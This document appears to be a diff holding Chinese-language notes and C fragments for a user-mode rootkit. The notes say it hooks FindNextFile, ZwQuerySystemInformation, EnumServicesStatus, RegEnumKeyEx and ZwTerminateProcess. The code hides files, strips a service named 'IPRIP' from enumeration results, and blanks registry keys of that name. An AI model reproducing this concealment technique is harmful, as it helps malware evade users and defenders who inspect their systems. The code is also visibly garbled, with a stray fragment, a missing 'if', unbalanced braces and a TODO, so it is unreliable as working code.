@@ -1,0 +1,49 @@
+文件隐藏使用的是hook，FindNextFileA和FindNextFileW。
+进程隐藏是hook ZwQuerySystemInformation。
+服务隐藏是hook,EnumServicesStatusA和EnumServicesStatusW
+注册表隐藏是hook RegEnumKeyExW和RegEnumKeyExA
+还hook了这个API，ZwTerminateProcess
+
+
+//
+//隐藏文件,hook FindFirstFileW,FindNextFileW
+//
+BOOL bBreak = FALSE;
+while(wcsnicmp((WCHAR *)lpFindFileData->cFileName,strHideFile,wcslen(strHideFile))==0)
+{
+   bBreak = Old_FindNextFileW(hFind,lpFindFileData);
+   if(bBreak == FALSE)
+      break;
+} 
+while(wcsnicmp((WCHAR *)lpFindFileData->cFileName,strHideFile,wcslen(strHideFile))==0)
+{
+   bReturn = Old_FindNextFileW(hFindFile,lpFindFileData);
+   if(bReturn == FALSE)
+    break;
+}
+
+//
+//隐藏服务,hook EnumServicesStatusW 将服务从队列中脱去,实现隐藏
+// 
+for (DWORD dwIndex = 0;dwIndex < *lpServicesReturned; dwIndex ++) 
+{
+   if (wcsnicmp(lpServices[dwIndex].lpServiceName,L"IPRIP",wcslen(L"IPRIP")) == 0)eFile)) == 0) 
+   {
+    //向前移动服务列表缓冲区
+     (dwIndex < (*lpServicesReturned) - 1)
+     {
+       memmove(&lpServices[dwIndex],&lpServices[dwIndex+1],sizeof(ENUM_SERVICE_STATUSA)*(*lpServicesReturned - dwIndex - 1));
+       (*lpServicesReturned)--;
+     } 
+  else 
+  {
+     //TODO
+  } 
+
+//
+//隐藏注册表,hook RegEnumKeyExW,RegEnumKeyW
+//
+if (wcsnicmp(lpName,L"IPRIP",wcslen(L"IPRIP")) == 0)
+{
+   memset(lpName,0,*lpcbName);
+}
